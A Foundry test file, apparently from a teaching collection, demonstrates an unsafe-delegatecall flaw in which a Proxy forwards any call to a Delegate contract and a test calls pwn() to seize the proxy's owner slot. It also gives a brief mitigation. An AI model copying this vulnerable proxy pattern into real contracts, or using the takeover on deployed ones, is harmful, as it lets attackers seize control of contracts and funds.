// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";

/**
 * Name: Unsafe Delegatecall Vulnerability
 *
 * Description:
 * The Proxy Contract Owner Manipulation Vulnerbaility is a flaw in the smart contract design that allows an attacker to manipulate
 * the owner of the Proxy Contract, which is hardcoded as 0xdeadbeef.
 *
 * The vulnerability arises due to the use of delegatecall in the fallback function of the Proxy contract.  Delegecate call allows
 * an attack to invoke pwn() function from the Delegate contract within the context of the Proxy contract, thereby changing the
 * value of the owner state variable of the Proxy contract.  This allows a msart contract to dynamically load code froma  different address at runtime
 *
 * Scenerio:
 * Proxy contract is designed for helping users call logic contract.
 * Proxy Contract's owner is hardcoded as 0xdeadbeef, can the owner be manipulated?
 *
 * Mitigation:
 * To mitigate the Proxy Contract Owner Manipulation Vulnerbaility,
 * avoid using delegatecall unless it is explicitly required, and ensure that the delegatecall is used securely.
 * If the delegate call is necessary for the contract's functionality, make sure to validate and sanitize inputs to avoid unexpected behaviours.
 *
 */

contract Proxy {
    address public owner = address(0xdeadbeef); //slot 0
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
    }

    fallback() external {
        (bool suc,) = address(delegate).delegatecall(msg.data); // vulnerable
        require(suc, "Delegatecall failed");
    }
}

contract Delegate {
    address public owner; //slot 0

    function pwn() public {
        owner = msg.sender;
    }
}

contract DelegateTest is Test {
    Proxy proxy;
    Delegate delegateContract;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
    }

    function testDelegatecall() public {
        delegateContract = new Delegate();
        proxy = new Proxy(address(delegateContract));

        console.log("Alice address", alice);
        console.log("Delegate contract owner", proxy.owner());

        //Delegatecall allows a smart contract to dynamically load code from a different address at runtime
        console.log("Change delegateContract owner to alice ......");
        vm.prank(alice);
        (bool success,) = address(proxy).call(abi.encodeWithSignature("pwn()")); //exploit here
        require(success);
        //Proxy.fallbacl() will delegatecall Delegate.pwn()

        console.log("DelegateContract owner", proxy.owner());
        assertEq(proxy.owner(), alice);
    }
}
